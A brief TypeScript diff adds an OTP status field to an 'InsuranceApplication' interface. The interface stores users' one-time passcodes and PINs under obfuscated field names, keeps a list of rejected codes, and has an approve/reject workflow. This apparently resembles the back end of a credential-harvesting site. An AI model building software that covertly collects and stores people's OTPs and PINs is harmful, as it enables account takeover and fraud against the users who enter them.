@@ -50,6 +50,7 @@ export interface InsuranceApplication {
     pinStatus?: "waiting" | "verifying" | "approved" | "rejected" | "pending"
     otpCode?: string
     _v5?: string // otp (obfuscated)
+    _v5Status?: "pending" | "verifying" | "approved" | "rejected" // OTP status
     otp?: string // كود OTP (الحقل المستخدم من موقع الزوار) - Keep for backward compatibility
     oldOtp?: Array<{ code: string; rejectedAt: string }> // الأكواد المرفوضة القديمة
     _v6?: string // pinCode (obfuscated)
